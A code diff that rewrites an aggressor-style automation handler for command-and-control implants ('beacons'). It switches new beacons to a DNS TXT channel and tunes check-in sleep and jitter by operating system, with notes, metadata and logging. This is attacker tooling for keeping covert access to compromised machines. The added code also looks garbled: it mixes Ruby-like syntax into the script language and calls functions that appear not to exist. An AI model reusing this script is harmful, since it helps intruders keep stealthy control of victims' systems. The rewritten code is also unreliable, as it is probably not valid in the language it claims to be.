@@ -1,6 +1,35 @@
-on beacon_initial_empty {
-	bmode($1, "dns-txt");	
-	bcheckin($1);
-	bnote($1, "-needs to be evaluated!");
-	bsleep($1, 120, 20)
-}
+beacon_initial_empty ->
+    bid = $1; # Get the beacon ID
+
+    # Set communication mode to DNS TXT
+    bmode bid, "dns-txt";
+
+    # Force a check-in to apply the mode change
+    bcheckin bid;
+
+    # Add a note for operator review
+    bnote bid, "- Initial DNS TXT, needs review";
+
+    # Set sleep time and jitter (adjust as needed)
+    bsleep bid, 180, 25; # 3 minutes with 25% jitter
+
+    # Optional: Set a user-defined metadata field
+    bsetmetadata bid, "initial_config", "dns-txt_3min_25jitter";
+
+    # Optional: Log the initial configuration
+    println "[+] Initial DNS TXT config applied to beacon: #{bid}";
+
+    # Optional: check the operating system and set a different sleep time.
+    os = beacon_host(bid, "os");
+    if os =~ /Windows/i
+      bsleep bid, 120, 15; # Windows: 2 minutes with 15% jitter
+      bnote bid, "- Windows system, adjusted sleep time"
+      bsetmetadata bid, "initial_config", "dns-txt_2min_15jitter_windows";
+      println "[+] Windows specific sleep time applied to beacon: #{bid}";
+    else if os =~ /Linux/i
+      bsleep bid, 240, 30; # Linux: 4 minutes with 30% jitter
+      bnote bid, "- Linux system, adjusted sleep time"
+      bsetmetadata bid, "initial_config", "dns-txt_4min_30jitter_linux";
+      println "[+] Linux specific sleep time applied to beacon: #{bid}";
+    else
+      println "[-] OS not detected, using default sleep time: #{bid}";
